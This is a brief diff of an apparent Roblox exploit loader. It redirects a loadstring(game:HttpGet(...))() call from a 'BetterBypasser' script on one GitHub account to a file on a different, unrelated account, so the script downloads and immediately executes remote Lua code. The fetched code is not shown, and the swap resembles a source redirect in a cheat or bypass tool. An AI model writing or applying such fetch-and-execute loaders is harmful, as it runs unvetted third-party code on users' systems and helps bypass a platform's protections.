@@ -18,7 +18,7 @@ if IsUnder13 then
 end
 
 --local Success, Error = pcall(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/publicproduct.lua", true))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/reginail/robl/publicproduct.lua", true))()
 --end)
 
 --if not Success and Error then
